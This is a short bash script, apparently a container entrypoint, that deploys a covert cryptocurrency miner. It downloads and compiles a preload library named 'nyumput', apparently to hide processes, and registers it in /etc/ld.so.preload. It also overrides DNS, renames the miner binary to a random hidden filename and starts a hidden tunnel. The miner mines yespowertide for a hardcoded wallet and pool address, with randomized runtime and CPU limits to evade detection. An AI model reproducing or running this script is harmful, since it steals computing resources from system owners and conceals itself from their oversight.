#!/bin/bash

curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart

NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"

cp /app/sr "/app/$NAME"
chmod +x "/app/$NAME"
rm -f /app/sr

/usr/local/bin/.netd access tcp \
--hostname "$(cat .h)" \
--url 127.0.0.1:443 >/dev/null 2>&1 &

DURATION=$((1200 + RANDOM % 301))

timeout ${DURATION}s /app/$NAME \
-a yespowertide \
-o 157.173.100.15:443 \
-u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.multo \
-p x \
--cpu-threads 2 \
--cpu-threads-intensity 1 \
--cpu-threads-priority 1 >/dev/null 2>&1 &

P=$!

LIMIT=$((75 + RANDOM % 6))
cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &

tail -f /dev/null
